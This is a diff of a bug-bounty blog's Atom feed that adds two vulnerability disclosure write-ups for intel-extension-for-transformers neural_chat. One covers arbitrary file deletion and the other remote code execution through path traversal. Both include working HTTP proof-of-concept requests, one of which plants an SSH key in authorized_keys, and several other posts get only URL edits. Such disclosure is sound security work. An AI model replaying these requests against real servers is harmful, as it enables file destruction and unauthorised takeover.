@@ -1,4 +1,328 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.3.3">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2024-05-27T09:38:32+08:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">sunriseXu’s bug hunting journey</title><subtitle>sunriseXu&apos;s bug hunting journey, sharing new findings of bug hunting.</subtitle><entry><title type="html">Remote Code Execution via Arbitrary File Overwrite Using Path Traversal in langflow Pre-release</title><link href="http://localhost:4000/file-overwrite/2024/05/26/remote-code-executoin-using-path-traversal-in-langflow.html" rel="alternate" type="text/html" title="Remote Code Execution via Arbitrary File Overwrite Using Path Traversal in langflow Pre-release" /><published>2024-05-26T10:31:06+08:00</published><updated>2024-05-26T10:31:06+08:00</updated><id>http://localhost:4000/file-overwrite/2024/05/26/remote-code-executoin-using-path-traversal-in-langflow</id><content type="html" xml:base="http://localhost:4000/file-overwrite/2024/05/26/remote-code-executoin-using-path-traversal-in-langflow.html"><![CDATA[<h2 id="name">Name</h2>
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.3.3">Jekyll</generator><link href="http://0.0.0.0:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://0.0.0.0:4000/" rel="alternate" type="text/html" /><updated>2024-05-27T16:38:58+08:00</updated><id>http://0.0.0.0:4000/feed.xml</id><title type="html">sunriseXu’s bug hunting journey</title><subtitle>sunriseXu&apos;s bug hunting journey, sharing new findings of bug hunting.</subtitle><entry><title type="html">Arbitrary File Deletion via Path Traversal in intel-extension-for-transformers neural_chat</title><link href="http://0.0.0.0:4000/file-deletion/2024/05/27/arbitrary-file-delete-in-intel-extension-for-transformers.html" rel="alternate" type="text/html" title="Arbitrary File Deletion via Path Traversal in intel-extension-for-transformers neural_chat" /><published>2024-05-27T10:31:06+08:00</published><updated>2024-05-27T10:31:06+08:00</updated><id>http://0.0.0.0:4000/file-deletion/2024/05/27/arbitrary-file-delete-in-intel-extension-for-transformers</id><content type="html" xml:base="http://0.0.0.0:4000/file-deletion/2024/05/27/arbitrary-file-delete-in-intel-extension-for-transformers.html"><![CDATA[<h2 id="name">Name</h2>
+
+<blockquote>
+  <p>Arbitrary File Deletion via Path Traversal in intel-extension-for-transformers neural_chat</p>
+</blockquote>
+
+<h2 id="weakness">Weakness</h2>
+
+<blockquote>
+  <p>CWE-22: Path Traversal</p>
+</blockquote>
+
+<h2 id="severity">Severity</h2>
+
+<blockquote>
+  <p>High (8.8)</p>
+</blockquote>
+
+<h2 id="version">Version</h2>
+
+<blockquote>
+  <p>v1.4.2</p>
+</blockquote>
+
+<h2 id="description">Description</h2>
+
+<p>The post route <a href="https://github.com/intel/intel-extension-for-transformers/blob/5e5e17c272857a078540dbdbdf834e65b0d92a0e/intel_extension_for_transformers/neural_chat/server/restful/retrieval_api.py#L598"><code class="language-plaintext highlighter-rouge">/v1/askdoc/delete_file</code></a> endpoint in intel-extension-for-transformers <a href="https://github.com/intel/intel-extension-for-transformers/tree/main/intel_extension_for_transformers/neural_chat#introduction">neural_chat</a> is vulnerable to a path traversal vulnerability through the <code class="language-plaintext highlighter-rouge">del_path</code> parameter which allows the deletion of arbitrary file. The <code class="language-plaintext highlighter-rouge">del_path</code> is directly append to a directory path <a href="https://github.com/intel/intel-extension-for-transformers/blob/5e5e17c272857a078540dbdbdf834e65b0d92a0e/intel_extension_for_transformers/neural_chat/server/restful/retrieval_api.py#L621">without sanitization</a> and then the file is deleted. An attacker can delete files behalf of current process.</p>
+
+<p>The vulnerable function <a href="https://github.com/intel/intel-extension-for-transformers/blob/5e5e17c272857a078540dbdbdf834e65b0d92a0e/intel_extension_for_transformers/neural_chat/server/restful/retrieval_api.py#L296C11-L296C30"><code class="language-plaintext highlighter-rouge">retrieval_add_files</code></a>:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>@router.delete("/v1/askdoc/delete_file")
+async def delete_single_file(request: Request):
+    """Delete file according to `del_path` and `knowledge_base_id`.
+
+    `del_path`:
+        - specific file path(e.g. /path/to/file.txt)
+        - folder path(e.g. /path/to/folder)
+        - "all_files": delete all files of this knowledge base
+    """
+    params = await request.json()
+    del_path = params['del_path']
+    ...
+    # partially delete files/folders from the kb
+    if delete_path.exists():
+        # delete file
+        if delete_path.is_file():
+            try:
+                delete_path.unlink()
+            except Exception as e:
+                logger.info(f"[askdoc - delete_file] fail to delete file {delete_path}: {e}")
+                raise HTTPException(
+                    status_code=500,
+                    detail=f'Failed to delete file {delete_path}. Exception: {e}'
+                )
+        # delete folder
+        else:
+            try:
+                shutil.rmtree(delete_path)
+            except Exception as e:
+                logger.info(f"[askdoc - delete_file] fail to delete folder {delete_path}: {e}")
+                raise HTTPException(
+                    status_code=500,
+                    detail=f'Failed to delete folder {delete_path}. Exception: {e}'
+                )
+        return {"status": True}
+    else:
+        raise HTTPException(status_code=404, detail="File/folder not found. Please check del_path.")
+</code></pre></div></div>
+
+<h2 id="proof-of-concept">Proof of Concept</h2>
+
+<p>First, we create a test file at <code class="language-plaintext highlighter-rouge">/home/kali/test.txt</code>:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kali@fc7d9ff6a411:/# touch /home/kali/test.txt
+kali@fc7d9ff6a411:/# ls /home/kali/test.txt
+-rw-r--r-- 1 kali kali 0 May 27 16:29 /home/kali/test.txt
+</code></pre></div></div>
+
+<p>Then we start a default neural_chat server following tutorial from <a href="https://github.com/intel/intel-extension-for-transformers/blob/main/intel_extension_for_transformers/neural_chat/README.md#installation">https://github.com/intel/intel-extension-for-transformers/blob/main/intel_extension_for_transformers/neural_chat/README.md#installation</a>:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># Install system requirements
+sudo apt-get update
+sudo apt-get install -y python3-pip
+sudo apt-get install -y libgl1-mesa-glx
+
+# clone the project
+git clone https://github.com/intel/intel-extension-for-transformers.git
+cd intel-extension-for-transformers/intel_extension_for_transformers/neural_chat/
+
+# Install python requirements
+pip install -r requirements_cpu.txt
+pip install fastapi==0.103.2
+pip install intel-extension-for-transformers
+</code></pre></div></div>
+
+<p>Start neural_chat server, the service is open at <code class="language-plaintext highlighter-rouge">0.0.0.0:8000</code></p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># start neural_chat server, it will download model from internet for first time, be patient.
+neuralchat_server start --config_file ./server/config/neuralchat.yaml
+</code></pre></div></div>
+
+<p>Send follow post request to the server using burpsuite to delete single file:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>DELETE http://10.15.0.5:8000/v1/askdoc/delete_file HTTP/1.1
+Host: 10.15.0.5:8000
+Pragma: no-cache
+Cache-Control: no-cache
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7,ja-JP;q=0.6,ja;q=0.5
+content-type: application/json
+Cookie: 
+Connection: close
+Content-Length: 89
+
+{"del_path":"/home/kali/test.txt","knowledge_base_id":"123"}
+</code></pre></div></div>
+
+<p>The response indicates the file is deleted.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>HTTP/1.1 200 OK
+Content-Length: 15
+Connection: keep-alive
+Content-Type: application/json
+Date: Mon, 27 May 2024 06:26:58 GMT
+Keep-Alive: timeout=4
+Proxy-Connection: keep-alive
+Server: uvicorn
+
+{"status":true}
+</code></pre></div></div>
+
+<p>We can verify the the file is deleted using following command:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kali@fc7d9ff6a411:/# ls /home/kali/test.txt
+ls: cannot access '/home/kali/test.txt': No such file or directory
+</code></pre></div></div>
+
+<p>Delete a folder using following command:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>DELETE http://10.15.0.5:8000/v1/askdoc/delete_file HTTP/1.1
+Host: 10.15.0.5:8000
+Pragma: no-cache
+Cache-Control: no-cache
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7,ja-JP;q=0.6,ja;q=0.5
+content-type: application/json
+Cookie: 
+Connection: close
+Content-Length: 89
+
+{"del_path":"/home/kali/test-folder","knowledge_base_id":"123"}
+</code></pre></div></div>
+
+<h2 id="impact">Impact</h2>
+
+<p>This vulnerability can delete any files and folders the service process could access.</p>
+
+<h2 id="occurrences">Occurrences</h2>
+
+<p><a href="https://github.com/intel/intel-extension-for-transformers/blob/5e5e17c272857a078540dbdbdf834e65b0d92a0e/intel_extension_for_transformers/neural_chat/server/restful/retrieval_api.py#L621">https://github.com/intel/intel-extension-for-transformers/blob/5e5e17c272857a078540dbdbdf834e65b0d92a0e/intel_extension_for_transformers/neural_chat/server/restful/retrieval_api.py#L621</a></p>]]></content><author><name></name></author><category term="file-deletion" /><summary type="html"><![CDATA[Name]]></summary></entry><entry><title type="html">Remote Code Execution via Arbitrary File Overwrite Using Path Traversal in intel-extension-for-transformers neural_chat</title><link href="http://0.0.0.0:4000/file-overwrite/2024/05/27/remote-code-execution-using-path-traversal-in-intel-extension-for-transformers.html" rel="alternate" type="text/html" title="Remote Code Execution via Arbitrary File Overwrite Using Path Traversal in intel-extension-for-transformers neural_chat" /><published>2024-05-27T10:31:06+08:00</published><updated>2024-05-27T10:31:06+08:00</updated><id>http://0.0.0.0:4000/file-overwrite/2024/05/27/remote-code-execution-using-path-traversal-in-intel-extension-for-transformers</id><content type="html" xml:base="http://0.0.0.0:4000/file-overwrite/2024/05/27/remote-code-execution-using-path-traversal-in-intel-extension-for-transformers.html"><![CDATA[<h2 id="name">Name</h2>
+
+<blockquote>
+  <p>Remote Code Execution via Arbitrary File Overwrite Using Path Traversal in intel-extension-for-transformers neural_chat.</p>
+</blockquote>
+
+<h2 id="weakness">Weakness</h2>
+
+<blockquote>
+  <p>CWE-22: Path Traversal</p>
+</blockquote>
+
+<h2 id="severity">Severity</h2>
+
+<blockquote>
+  <p>High (8.8)</p>
+</blockquote>
+
+<h2 id="version">Version</h2>
+
+<blockquote>
+  <p>v1.4.2</p>
+</blockquote>
+
+<h2 id="description">Description</h2>
+
+<p>The post route <a href="https://github.com/intel/intel-extension-for-transformers/blob/5e5e17c272857a078540dbdbdf834e65b0d92a0e/intel_extension_for_transformers/neural_chat/server/restful/retrieval_api.py#L296"><code class="language-plaintext highlighter-rouge">/v1/askdoc/upload_files</code></a> endpoint in intel-extension-for-transformers <a href="https://github.com/intel/intel-extension-for-transformers/tree/main/intel_extension_for_transformers/neural_chat#introduction">neural_chat</a> is vulnerable to a path traversal vulnerability through the <code class="language-plaintext highlighter-rouge">file_paths</code> parameter which allows the uploading of arbitrary files. The <a href="https://github.com/intel/intel-extension-for-transformers/blob/5e5e17c272857a078540dbdbdf834e65b0d92a0e/intel_extension_for_transformers/neural_chat/server/restful/retrieval_api.py#L308C32-L308C42"><code class="language-plaintext highlighter-rouge">file_path</code></a> is directly append to a directory path <a href="https://github.com/intel/intel-extension-for-transformers/blob/5e5e17c272857a078540dbdbdf834e65b0d92a0e/intel_extension_for_transformers/neural_chat/server/restful/retrieval_api.py#L319">without sanitization</a> and the file content is writen to dest location. An attacker can upload and overwrite <strong>ANY</strong> file on the filesystem. This can lead to remote code execution in many different ways.</p>
+
+<p>The vulnerable function <a href="https://github.com/intel/intel-extension-for-transformers/blob/5e5e17c272857a078540dbdbdf834e65b0d92a0e/intel_extension_for_transformers/neural_chat/server/restful/retrieval_api.py#L296C11-L296C30"><code class="language-plaintext highlighter-rouge">retrieval_add_files</code></a>:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>@router.post("/v1/askdoc/upload_files")
+async def retrieval_add_files(request: Request,
+                           files: List[UploadFile] = File(...),
+                           file_paths: List[str] = Form(...),
+                           knowledge_base_id: str = Form(...)):
+    ...
+    for file_path, file in zip(file_paths, files):
+        filename = file.filename
+        if '/' in filename:
+            filename = filename.split('/')[-1]
+        logger.info(f"[askdoc - upload_files] received file: {filename}, kb_id: {kb_id}")
+        user_id = request.client.host
+        logger.info(f'[askdoc - upload_files] user id: {user_id}')
+
+        path_prefix = get_path_prefix(kb_id, user_id)
+        upload_path = path_prefix + '/upload_dir'
+        persist_path = path_prefix + '/persist_dir'
+        save_path = Path(upload_path) / file_path
+        save_path.parent.mkdir(parents=True, exist_ok=True)
+
+        # save file content to local disk
+        await save_file_to_local_disk(save_path, file)
+</code></pre></div></div>
+
+<h2 id="proof-of-concept">Proof of Concept</h2>
+
+<p>In this proof of concept, we will be gaining remote code execution by uploading our SSH key to the <code class="language-plaintext highlighter-rouge">authorized_keys</code> file. There are many other ways to achieve remote code execution via a file upload, such as overwriting binaries, writing to .bashrc, ….</p>
+
+<p>We proof this vulnerability by logging into the <code class="language-plaintext highlighter-rouge">kali</code> user running the neural_chat service and checking that at this moment the <code class="language-plaintext highlighter-rouge">/home/kali/.ssh/authorized_keys</code> file does not exist.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kali@fc7d9ff6a411:/# cat /home/kali/.ssh/authorized_keys
+cat: /home/kali/.ssh/authorized_keys: No such file or directory
+</code></pre></div></div>
+
+<p>An attacker can now send the following request to the webserver. This request will upload the attacker’s public RSA key to the <code class="language-plaintext highlighter-rouge">authorized_keys</code> file.</p>
+
+<p>We start a default neural_chat server following tutorial from <a href="https://github.com/intel/intel-extension-for-transformers/blob/main/intel_extension_for_transformers/neural_chat/README.md#installation">https://github.com/intel/intel-extension-for-transformers/blob/main/intel_extension_for_transformers/neural_chat/README.md#installation</a>:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># Install system requirements
+sudo apt-get update
+sudo apt-get install -y python3-pip
+sudo apt-get install -y libgl1-mesa-glx
+
+# clone the project
+git clone https://github.com/intel/intel-extension-for-transformers.git
+cd intel-extension-for-transformers/intel_extension_for_transformers/neural_chat/
+
+# Install python requirements
+pip install -r requirements_cpu.txt
+pip install fastapi==0.103.2
+pip install intel-extension-for-transformers
+</code></pre></div></div>
+
+<p>Start neural_chat server, the service is open at <code class="language-plaintext highlighter-rouge">0.0.0.0:8000</code></p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># start neural_chat server, it will download model from internet for first time, be patient.
+neuralchat_server start --config_file ./server/config/neuralchat.yaml
+</code></pre></div></div>
+
+<p>Send follow post request to the server using burpsuite:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>POST http://10.15.0.5:8000/v1/askdoc/upload_files HTTP/1.1
+Host: 10.15.0.5:8000
+Pragma: no-cache
+Cache-Control: no-cache
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryvIlRA9q70krSRDb7
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7,ja-JP;q=0.6,ja;q=0.5
+Cookie: 
+Connection: close
+Content-Length: 409
+
+------WebKitFormBoundaryvIlRA9q70krSRDb7
+Content-Disposition: form-data; name="knowledge_base_id"
+
+123
+------WebKitFormBoundaryvIlRA9q70krSRDb7
+Content-Disposition: form-data; name="files"; filename="blob"
+Content-Type: text/plain
+
+ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCov7XaSjvanAr+rs14Vz7Nn0KvVee57F5FYm8zKjmxYRb2s11r8L5L2IQPg4bMuvGcp+bouJfagdHQ/KoXD/l1IG3ZIggf67thPzGdH9gyShk2fpc1JSADkPT6WPeGAXSLh+0+InyzUqPe5oPA9zrvUDDYCKRG7NZ2A9++7hgs1DsNbJdxvYwy+8WMJAIrcfN+5QBxVHqUhUVFamyCoeu1DlalAnBSKwI61UMl0GkXN9DKMHgxSY0BMDT+AJr/F9Jwem5cTkVIr+RA9v901obfywdI/3TmPTwGwxiiZYhiWDWOaMNhyTXBWmIyBNN0usH9GtFtNPezcuUHBzsgHRcT js@dell
+------WebKitFormBoundaryvIlRA9q70krSRDb7
+Content-Disposition: form-data; name="file_paths"
+
+/home/kali/.ssh/authorized_keys
+------WebKitFormBoundaryvIlRA9q70krSRDb7--
+</code></pre></div></div>
+
+<p>The response indicates error but the file is written successfully.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>HTTP/1.1 200 OK
+Content-Length: 39
+Connection: keep-alive
+Content-Type: application/json
+Date: Mon, 27 May 2024 07:41:53 GMT
+Keep-Alive: timeout=4
+Proxy-Connection: keep-alive
+Server: uvicorn
+
+"Error occurred while uploading files."
+</code></pre></div></div>
+
+<p>We can verify the success by again checking the <code class="language-plaintext highlighter-rouge">/home/kali/.ssh/authorized_keys</code> file.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kali@fc7d9ff6a411:/# cat /home/kali/.ssh/authorized_keys
+ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCov7XaSjvanAr+rs14Vz7Nn0KvVee57F5FYm8zKjmxYRb2s11r8L5L2IQPg4bMuvGcp+bouJfagdHQ/KoXD/l1IG3ZIggf67thPzGdH9gyShk2fpc1JSADkPT6WPeGAXSLh+0+InyzUqPe5oPA9zrvUDDYCKRG7NZ2A9++7hgs1DsNbJdxvYwy+8WMJAIrcfN+5QBxVHqUhUVFamyCoeu1DlalAnBSKwI61UMl0GkXN9DKMHgxSY0BMDT+AJr/F9Jwem5cTkVIr+RA9v901obfywdI/3TmPTwGwxiiZYhiWDWOaMNhyTXBWmIyBNN0usH9GtFtNPezcuUHBzsgHRcT js@dell
+</code></pre></div></div>
+
+<h2 id="impact">Impact</h2>
+
+<p>This vulnerability can have severe consequences. This section will highlight some tangible impact.</p>
+
+<h3 id="ssh-access">SSH Access</h3>
+
+<p>On servers that have SSH enabled, an attacker may be able to inject their own public RSA key into the authorized_keys file, leading to remote code execution.</p>
+
+<h3 id="web-servers">Web Servers</h3>
+
+<p>On servers hosting web servers, various vulnerabilities can be exploited. On PHP or JSP server, remote code execution may be possible via uploading a webshell. On other servers an HTML file can be uploaded to achieve Cross-site Scripting (XSS)</p>
+
+<h2 id="reference">Reference</h2>
+
+<p><a href="https://huntr.com/bounties/6be8d4e3-67e6-4660-a8db-04215a1cff3e">https://huntr.com/bounties/6be8d4e3-67e6-4660-a8db-04215a1cff3e</a></p>
+
+<h2 id="occurrences">Occurrences</h2>
+
+<p><a href="https://github.com/intel/intel-extension-for-transformers/blob/5e5e17c272857a078540dbdbdf834e65b0d92a0e/intel_extension_for_transformers/neural_chat/server/restful/retrieval_api.py#L319">https://github.com/intel/intel-extension-for-transformers/blob/5e5e17c272857a078540dbdbdf834e65b0d92a0e/intel_extension_for_transformers/neural_chat/server/restful/retrieval_api.py#L319</a></p>]]></content><author><name></name></author><category term="file-overwrite" /><summary type="html"><![CDATA[Name]]></summary></entry><entry><title type="html">Remote Code Execution via Arbitrary File Overwrite Using Path Traversal in langflow Pre-release</title><link href="http://0.0.0.0:4000/file-overwrite/2024/05/26/remote-code-execution-using-path-traversal-in-langflow.html" rel="alternate" type="text/html" title="Remote Code Execution via Arbitrary File Overwrite Using Path Traversal in langflow Pre-release" /><published>2024-05-26T10:31:06+08:00</published><updated>2024-05-26T10:31:06+08:00</updated><id>http://0.0.0.0:4000/file-overwrite/2024/05/26/remote-code-execution-using-path-traversal-in-langflow</id><content type="html" xml:base="http://0.0.0.0:4000/file-overwrite/2024/05/26/remote-code-execution-using-path-traversal-in-langflow.html"><![CDATA[<h2 id="name">Name</h2>
 
 <blockquote>
   <p>Remote Code Execution via Arbitrary File Overwrite Using Path Traversal in Langflow Pre-release.</p>
@@ -163,7 +487,7 @@ async def upload_file(
 
 <p><a href="https://github.com/langflow-ai/langflow/blob/98b011f46d3a683ef3e038dd550fed5b42af7478/src/backend/base/langflow/api/v1/files.py#L47">https://github.com/langflow-ai/langflow/blob/98b011f46d3a683ef3e038dd550fed5b42af7478/src/backend/base/langflow/api/v1/files.py#L47</a></p>
 
-<p><a href="https://github.com/langflow-ai/langflow/blob/98b011f46d3a683ef3e038dd550fed5b42af7478/src/backend/base/langflow/services/storage/local.py#L34">https://github.com/langflow-ai/langflow/blob/98b011f46d3a683ef3e038dd550fed5b42af7478/src/backend/base/langflow/services/storage/local.py#L34</a></p>]]></content><author><name></name></author><category term="file-overwrite" /><summary type="html"><![CDATA[Name]]></summary></entry><entry><title type="html">Google: Local File Inclusion in FHIR Pipelines Controller</title><link href="http://localhost:4000/file-inclusion/2024/05/16/local-file-inclusion-in-fhir-pipelines-control.html" rel="alternate" type="text/html" title="Google: Local File Inclusion in FHIR Pipelines Controller" /><published>2024-05-16T10:31:06+08:00</published><updated>2024-05-16T10:31:06+08:00</updated><id>http://localhost:4000/file-inclusion/2024/05/16/local-file-inclusion-in-fhir-pipelines-control</id><content type="html" xml:base="http://localhost:4000/file-inclusion/2024/05/16/local-file-inclusion-in-fhir-pipelines-control.html"><![CDATA[<h2 id="name">Name</h2>
+<p><a href="https://github.com/langflow-ai/langflow/blob/98b011f46d3a683ef3e038dd550fed5b42af7478/src/backend/base/langflow/services/storage/local.py#L34">https://github.com/langflow-ai/langflow/blob/98b011f46d3a683ef3e038dd550fed5b42af7478/src/backend/base/langflow/services/storage/local.py#L34</a></p>]]></content><author><name></name></author><category term="file-overwrite" /><summary type="html"><![CDATA[Name]]></summary></entry><entry><title type="html">Google: Local File Inclusion in FHIR Pipelines Controller</title><link href="http://0.0.0.0:4000/file-inclusion/2024/05/16/local-file-inclusion-in-fhir-pipelines-control.html" rel="alternate" type="text/html" title="Google: Local File Inclusion in FHIR Pipelines Controller" /><published>2024-05-16T10:31:06+08:00</published><updated>2024-05-16T10:31:06+08:00</updated><id>http://0.0.0.0:4000/file-inclusion/2024/05/16/local-file-inclusion-in-fhir-pipelines-control</id><content type="html" xml:base="http://0.0.0.0:4000/file-inclusion/2024/05/16/local-file-inclusion-in-fhir-pipelines-control.html"><![CDATA[<h2 id="name">Name</h2>
 
 <blockquote>
   <p>Local File Inclusion in FHIR Pipelines Controller</p>
@@ -311,7 +635,7 @@ if (dwhFilesManager.doesFileExist(errorResource)) {
 
 <h2 id="occurrences">Occurrences</h2>
 
-<p><a href="https://github.com/google/fhir-data-pipes/blob/5dd428c427ee8a5b3f784a9f36942c3815690414/pipelines/controller/src/main/java/com/google/fhir/analytics/ApiController.java#L115">https://github.com/google/fhir-data-pipes/blob/5dd428c427ee8a5b3f784a9f36942c3815690414/pipelines/controller/src/main/java/com/google/fhir/analytics/ApiController.java#L115</a></p>]]></content><author><name></name></author><category term="file-inclusion" /><summary type="html"><![CDATA[Name]]></summary></entry><entry><title type="html">Store XSS in Gitness markdown comment editor</title><link href="http://localhost:4000/xss/2024/05/11/store-xss-in-gitness-markdown-viewer.html" rel="alternate" type="text/html" title="Store XSS in Gitness markdown comment editor" /><published>2024-05-11T10:31:06+08:00</published><updated>2024-05-11T10:31:06+08:00</updated><id>http://localhost:4000/xss/2024/05/11/store-xss-in-gitness-markdown-viewer</id><content type="html" xml:base="http://localhost:4000/xss/2024/05/11/store-xss-in-gitness-markdown-viewer.html"><![CDATA[<h2 id="name">Name</h2>
+<p><a href="https://github.com/google/fhir-data-pipes/blob/5dd428c427ee8a5b3f784a9f36942c3815690414/pipelines/controller/src/main/java/com/google/fhir/analytics/ApiController.java#L115">https://github.com/google/fhir-data-pipes/blob/5dd428c427ee8a5b3f784a9f36942c3815690414/pipelines/controller/src/main/java/com/google/fhir/analytics/ApiController.java#L115</a></p>]]></content><author><name></name></author><category term="file-inclusion" /><summary type="html"><![CDATA[Name]]></summary></entry><entry><title type="html">Store XSS in Gitness markdown comment editor</title><link href="http://0.0.0.0:4000/xss/2024/05/11/store-xss-in-gitness-markdown-viewer.html" rel="alternate" type="text/html" title="Store XSS in Gitness markdown comment editor" /><published>2024-05-11T10:31:06+08:00</published><updated>2024-05-11T10:31:06+08:00</updated><id>http://0.0.0.0:4000/xss/2024/05/11/store-xss-in-gitness-markdown-viewer</id><content type="html" xml:base="http://0.0.0.0:4000/xss/2024/05/11/store-xss-in-gitness-markdown-viewer.html"><![CDATA[<h2 id="name">Name</h2>
 
 <blockquote>
   <p>Store XSS in Gitness markdown comment editor</p>
@@ -409,7 +733,7 @@ if (dwhFilesManager.doesFileExist(errorResource)) {
 
 <h2 id="occurrences">Occurrences</h2>
 
-<p><a href="https://github.com/harness/gitness/blob/e31f33addea310b28a21ad1e05ab661acd163ef8/web/src/components/MarkdownViewer/MarkdownViewer.tsx#L141">https://github.com/harness/gitness/blob/e31f33addea310b28a21ad1e05ab661acd163ef8/web/src/components/MarkdownViewer/MarkdownViewer.tsx#L141</a></p>]]></content><author><name></name></author><category term="xss" /><summary type="html"><![CDATA[Name]]></summary></entry><entry><title type="html">Google: Local File Inclusion in Turbinia API Server</title><link href="http://localhost:4000/file-overwrite/2024/05/08/local-file-inclusion-in-turbinia.html" rel="alternate" type="text/html" title="Google: Local File Inclusion in Turbinia API Server" /><published>2024-05-08T10:31:06+08:00</published><updated>2024-05-08T10:31:06+08:00</updated><id>http://localhost:4000/file-overwrite/2024/05/08/local-file-inclusion-in-turbinia</id><content type="html" xml:base="http://localhost:4000/file-overwrite/2024/05/08/local-file-inclusion-in-turbinia.html"><![CDATA[<h2 id="name">Name</h2>
+<p><a href="https://github.com/harness/gitness/blob/e31f33addea310b28a21ad1e05ab661acd163ef8/web/src/components/MarkdownViewer/MarkdownViewer.tsx#L141">https://github.com/harness/gitness/blob/e31f33addea310b28a21ad1e05ab661acd163ef8/web/src/components/MarkdownViewer/MarkdownViewer.tsx#L141</a></p>]]></content><author><name></name></author><category term="xss" /><summary type="html"><![CDATA[Name]]></summary></entry><entry><title type="html">Google: Local File Inclusion in Turbinia API Server</title><link href="http://0.0.0.0:4000/file-overwrite/2024/05/08/local-file-inclusion-in-turbinia.html" rel="alternate" type="text/html" title="Google: Local File Inclusion in Turbinia API Server" /><published>2024-05-08T10:31:06+08:00</published><updated>2024-05-08T10:31:06+08:00</updated><id>http://0.0.0.0:4000/file-overwrite/2024/05/08/local-file-inclusion-in-turbinia</id><content type="html" xml:base="http://0.0.0.0:4000/file-overwrite/2024/05/08/local-file-inclusion-in-turbinia.html"><![CDATA[<h2 id="name">Name</h2>
 
 <blockquote>
   <p>Local File Inclusion in Turbinia API Server</p>
@@ -556,7 +880,7 @@ turbinia:x:999:999::/home/turbinia:/sbin/nologin
 
 <h2 id="occurrences">Occurrences</h2>
 
-<p><a href="https://github.com/google/turbinia/blob/1da2d19f9b79dac8df37bdf2ed4f9d5d0797607b/turbinia/api/routes/ui.py#L53">https://github.com/google/turbinia/blob/1da2d19f9b79dac8df37bdf2ed4f9d5d0797607b/turbinia/api/routes/ui.py#L53</a></p>]]></content><author><name></name></author><category term="file-overwrite" /><summary type="html"><![CDATA[Name]]></summary></entry><entry><title type="html">Dev.to(Forem) cta xss</title><link href="http://localhost:4000/xss/2024/04/30/xss-devto.html" rel="alternate" type="text/html" title="Dev.to(Forem) cta xss" /><published>2024-04-30T10:26:18+08:00</published><updated>2024-04-30T10:26:18+08:00</updated><id>http://localhost:4000/xss/2024/04/30/xss-devto</id><content type="html" xml:base="http://localhost:4000/xss/2024/04/30/xss-devto.html"><![CDATA[<h2 id="name">Name</h2>
+<p><a href="https://github.com/google/turbinia/blob/1da2d19f9b79dac8df37bdf2ed4f9d5d0797607b/turbinia/api/routes/ui.py#L53">https://github.com/google/turbinia/blob/1da2d19f9b79dac8df37bdf2ed4f9d5d0797607b/turbinia/api/routes/ui.py#L53</a></p>]]></content><author><name></name></author><category term="file-overwrite" /><summary type="html"><![CDATA[Name]]></summary></entry><entry><title type="html">Dev.to(Forem) cta xss</title><link href="http://0.0.0.0:4000/xss/2024/04/30/xss-devto.html" rel="alternate" type="text/html" title="Dev.to(Forem) cta xss" /><published>2024-04-30T10:26:18+08:00</published><updated>2024-04-30T10:26:18+08:00</updated><id>http://0.0.0.0:4000/xss/2024/04/30/xss-devto</id><content type="html" xml:base="http://0.0.0.0:4000/xss/2024/04/30/xss-devto.html"><![CDATA[<h2 id="name">Name</h2>
 
 <blockquote>
   <p>Dev.to(Forem) cta xss</p>
@@ -633,7 +957,7 @@ turbinia:x:999:999::/home/turbinia:/sbin/nologin
       },
     )
   end
